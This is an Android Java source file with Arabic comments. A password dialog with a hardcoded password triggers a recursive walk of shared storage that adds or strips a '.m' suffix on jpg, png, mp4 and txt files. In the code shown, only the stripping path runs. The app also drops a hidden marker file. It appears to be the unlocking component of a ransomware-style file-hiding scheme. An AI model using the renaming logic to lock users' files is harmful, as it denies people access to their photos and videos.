package com.my.newproject7;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.pm.PackageManager;
import android.Manifest;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

public class MainActivity extends Activity {

    private Button buttonDelete;
    private TextView textViewCurrentFile;
    private TextView textViewPercentage;
    private ProgressBar progressBar;
    private final String PASSWORD = "7610150"; // تأكد من استخدام أساليب آمنة للتخزين.

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        buttonDelete = findViewById(R.id.buttonDelete);
        textViewCurrentFile = findViewById(R.id.textViewCurrentFile);
        textViewPercentage = findViewById(R.id.textViewPercentage);
        progressBar = findViewById(R.id.progressBar);

        // إنشاء الملف عند بدء التشغيل
        createUniqueFile(".RC12G28GJ25VJ28");

        buttonDelete.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                showPasswordDialog();
            }
        });

        checkPermissions();
    }

    private void checkPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
                    || checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1000);
            } else {
                initializeLogic();
            }
        } else {
            initializeLogic();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 1000 && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            initializeLogic();
        } else {
            finish(); // إنهاء النشاط إذا لم يتم منح الأذونات
        }
    }

    private void initializeLogic() {
        // يمكن إضافة منطق إضافي هنا إذا لزم الأمر
    }

    // دالة لإنشاء ملف فريد إذا لم يكن موجودًا
    private void createUniqueFile(String fileName) {
        String directoryPath = "/storage/emulated/0/";
        File file = new File(directoryPath, fileName);

        if (!file.exists()) {
            try {
                FileOutputStream fos = new FileOutputStream(file);
                fos.write("".getBytes()); // يمكنك كتابة محتوى الملف هنا إذا لزم الأمر
                fos.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        } else {
            // إذا كان الملف موجودًا، اخفِ شريط التقدم وTextView
            progressBar.setVisibility(View.GONE);
            textViewCurrentFile.setVisibility(View.GONE);
            textViewPercentage.setVisibility(View.GONE);
        }
    }

    private void showPasswordDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("أدخل كلمة السر");

        final EditText input = new EditText(this);
        builder.setView(input);

        builder.setPositiveButton("تأكيد", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                String enteredPassword = input.getText().toString();
                if (enteredPassword.equals(PASSWORD)) {
                    removeExtensionFromFiles(); // إذا كانت كلمة السر صحيحة، استدعاء دالة الحذف
                } else {
                    showErrorDialog("كلمة السر غير صحيحة.");
                }
            }
        });
        builder.setNegativeButton("إلغاء", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.cancel();
            }
        });

        builder.show();
    }

    private void showErrorDialog(String message) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("خطأ");
        builder.setMessage(message);
        builder.setPositiveButton("موافق", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
            }
        });
        builder.show();
    }

    // دالة لحذف اللاحقة ".m" من الملفات
    private void removeExtensionFromFiles() {
        new FileProcessorTask("").execute();
    }

    private class FileProcessorTask extends AsyncTask<Void, String, String> {
        private String extension;

        FileProcessorTask(String extension) {
            this.extension = extension;
        }

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            textViewCurrentFile.setText("بدء المعالجة...");
            progressBar.setVisibility(View.VISIBLE);
            progressBar.setProgress(0);
            textViewPercentage.setText("نسبة التقدم: 0%");
        }

        @Override
        protected String doInBackground(Void... voids) {
            String directoryPath = "/storage/emulated/0/";
            File directory = new File(directoryPath);
            return processFiles(directory, extension);
        }

        @Override
        protected void onProgressUpdate(String... values) {
            super.onProgressUpdate(values);
            textViewCurrentFile.setText("المعالجة: " + values[0]);
            progressBar.setProgress(Integer.parseInt(values[1]));
            textViewPercentage.setText("نسبة التقدم: " + values[1] + "%");
        }

        @Override
        protected void onPostExecute(String result) {
            super.onPostExecute(result);
            progressBar.setVisibility(View.GONE);
        }

        // دالة لمعالجة الملفات وإضافة أو حذف اللاحقة
        private String processFiles(File directory, String extension) {
            File[] files = directory.listFiles();
            if (files != null) {
                int totalFiles = files.length;
                int processedFiles = 0;

                for (File file : files) {
                    if (file.isDirectory()) {
                        String result = processFiles(file, extension);
                        if (!result.equals("تمت العملية بنجاح.")) {
                            return result;
                        }
                    } else if (file.isFile()) {
                        if (extension.equals(".m")) {
                            if (file.getName().endsWith(".jpg") || file.getName().endsWith(".png") || file.getName().endsWith(".mp4") || file.getName().endsWith(".txt")) {
                                String newFileName = file.getAbsolutePath() + extension;
                                File newFile = new File(newFileName);
                                if (!file.renameTo(newFile)) {
                                    return "فشل في إضافة اللاحقة '.m' إلى: " + file.getName();
                                }
                            }
                        } else {
                            if (file.getName().endsWith(".m")) {
                                String originalFileName = file.getAbsolutePath().substring(0, file.getAbsolutePath().length() - 2);
                                File originalFile = new File(originalFileName);
                                if (!file.renameTo(originalFile)) {
                                    return "فشل في حذف اللاحقة '.m' من: " + file.getName();
                                }
                            }
                        }
                        processedFiles++;
                        int progress = (int) ((processedFiles / (float) totalFiles) * 100);
                        publishProgress(file.getName(), String.valueOf(progress));
                    }
                }
            }
            return "تمت العملية بنجاح.";
        }
    }
                                   }
            
